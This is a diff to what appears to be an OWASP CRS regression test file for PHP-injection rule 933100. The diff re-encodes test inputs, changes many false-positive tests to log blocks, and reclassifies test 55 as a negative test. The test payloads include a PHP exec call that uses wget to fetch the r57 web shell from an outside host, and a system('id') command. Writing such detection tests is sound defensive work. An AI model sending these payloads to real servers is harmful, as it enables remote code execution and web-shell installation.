@@ -4,7 +4,9 @@ meta:
 rule_id: 933100
 tests:
   - test_id: 1
-    desc: PHP Injection Attack (933100) from old modsec regressions
+    desc: |
+      PHP Injection Attack: Short tag with exec function
+      decoded payload: <? exec('wget http://r57.biz/r57.txt -O
     stages:
       - input:
           dest_addr: 127.0.0.1
@@ -18,7 +20,7 @@ tests:
             User-Agent: "OWASP CRS test agent"
           method: GET
           port: 80
-          uri: "/get?foo=<?exec('wget%20http://r57.biz/r57.txt%20-O"
+          uri: "/get?foo=%3C%3F%20exec%28%27wget%20http%3A%2F%2Fr57.biz%2Fr57.txt%20-O"
           version: HTTP/1.1
         output:
           log:
@@ -181,7 +183,7 @@ tests:
           uri: "/get?foo=%3C%3Fxpaquet"
           version: HTTP/1.1
         output:
-          no_log:
+          log:
             no_expect_ids: [933100]
   - test_id: 11
     desc: |
@@ -199,7 +201,7 @@ tests:
           uri: "/api/orders?flux=%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%3Corder%3E%3Cid%3E12345%3C%2Fid%3E%3C%2Forder%3E"
           version: HTTP/1.1
         output:
-          no_log:
+          log:
             no_expect_ids: [933100]
   - test_id: 12
     desc: |
@@ -602,7 +604,7 @@ tests:
           uri: "/get?data=%3C%3Fxml-stylesheet%20type%3D%22text%2Fxsl%22%20href%3D%22style.xsl%22%3F%3E"
           version: HTTP/1.1
         output:
-          no_log:
+          log:
             no_expect_ids: [933100]
   - test_id: 34
     desc: |
@@ -620,7 +622,7 @@ tests:
           uri: "/api?doc=%3C%3Fxml%20version%3D%221.0%22%20standalone%3D%22yes%22%3F%3E"
           version: HTTP/1.1
         output:
-          no_log:
+          log:
             no_expect_ids: [933100]
   - test_id: 35
     desc: |
@@ -638,7 +640,7 @@ tests:
           uri: "/search?q=Is%20this%20a%20test%3F%20What%20do%20you%20think%3F"
           version: HTTP/1.1
         output:
-          no_log:
+          log:
             no_expect_ids: [933100]
   - test_id: 36
     desc: |
@@ -656,7 +658,7 @@ tests:
           uri: "/calc?expr=result%20%3D%20%28x%20%3C%205%29%20%3F%20yes%20%3A%20no"
           version: HTTP/1.1
         output:
-          no_log:
+          log:
             no_expect_ids: [933100]
   - test_id: 37
     desc: |
@@ -674,7 +676,7 @@ tests:
           uri: "/get?url=http%3A%2F%2Fexample.com%2Fpage%3Fid%3D123"
           version: HTTP/1.1
         output:
-          no_log:
+          log:
             no_expect_ids: [933100]
   - test_id: 38
     desc: |
@@ -693,7 +695,7 @@ tests:
           data: "image=%3C%3Fxml%20version%3D%221.0%22%3F%3E%3Csvg%3E%3C%2Fsvg%3E"
           version: HTTP/1.1
         output:
-          no_log:
+          log:
             no_expect_ids: [933100]
   - test_id: 39
     desc: |
@@ -711,7 +713,7 @@ tests:
           uri: "/get?style=%3C%3Fxsl-stylesheet%3F%3E"
           version: HTTP/1.1
         output:
-          no_log:
+          log:
             no_expect_ids: [933100]
   - test_id: 40
     desc: |
@@ -839,7 +841,7 @@ tests:
           uri: "/js?code=var%20x%20%3D%20%28a%20%3C%20b%29%20%3F%20c%20%3A%20d%3B%20%2F%2F%20%3C%3Ftest%20comment"
           version: HTTP/1.1
         output:
-          no_log:
+          log:
             no_expect_ids: [933100]
   - test_id: 47
     desc: |
@@ -857,7 +859,7 @@ tests:
           uri: "/contact?email=user%40%5B192.168.1.1%5D"
           version: HTTP/1.1
         output:
-          no_log:
+          log:
             no_expect_ids: [933100]
   - test_id: 48
     desc: |
@@ -895,7 +897,7 @@ tests:
           data: "metadata=%3C%3Fxpacket%20begin%3D%22%3F%22%20id%3D%22W5M0MpCehiHzreSzNTczkc9d%22%3F%3E"
           version: HTTP/1.1
         output:
-          no_log:
+          log:
             no_expect_ids: [933100]
   - test_id: 50
     desc: |
@@ -915,7 +917,7 @@ tests:
           data: "metadata=%3C%3Fxpacket%20end%3D%22w%22%3F%3E"
           version: HTTP/1.1
         output:
-          no_log:
+          log:
             no_expect_ids: [933100]
   - test_id: 51
     desc: |
@@ -934,7 +936,7 @@ tests:
           uri: "/test?tag=%3C%3Fxpacket"
           version: HTTP/1.1
         output:
-          no_log:
+          log:
             no_expect_ids: [933100]
   - test_id: 52
     desc: |
@@ -954,7 +956,7 @@ tests:
           data: "xmp=%3C%3FXPACKET%20begin%3D%22%3F%22%20id%3D%22test%22%3F%3E"
           version: HTTP/1.1
         output:
-          no_log:
+          log:
             no_expect_ids: [933100]
   - test_id: 53
     desc: |
@@ -974,7 +976,7 @@ tests:
           data: "content=%3C%3Fxpacket%20begin%3D%22%3F%22%20id%3D%22W5M0MpCehiHzreSzNTczkc9d%22%3F%3E%3Cx%3Axmpmeta%20xmlns%3Ax%3D%22adobe%3Ans%3Ameta%2F%22%3E"
           version: HTTP/1.1
         output:
-          no_log:
+          log:
             no_expect_ids: [933100]
   - test_id: 54
     desc: |
@@ -993,11 +995,11 @@ tests:
           uri: "/meta?data=%3C%3FxPacket%20begin%3D%22%3F%22%20id%3D%22test%22%3F%3E"
           version: HTTP/1.1
         output:
-          no_log:
+          log:
             no_expect_ids: [933100]
   - test_id: 55
     desc: |
-      PHP injection attack: Verify <?xphp still triggers (not XMP)
+      Negative test: <?xphp is not a valid PHP tag
       decoded payload: <?xphp system('id'); ?>
     stages:
       - input:
@@ -1012,7 +1014,7 @@ tests:
           version: HTTP/1.1
         output:
           log:
-            expect_ids: [933100]
+            no_expect_ids: [933100]
   - test_id: 56
     desc: |
       PHP injection attack: Verify <?xa still triggers (not XMP, not XML)
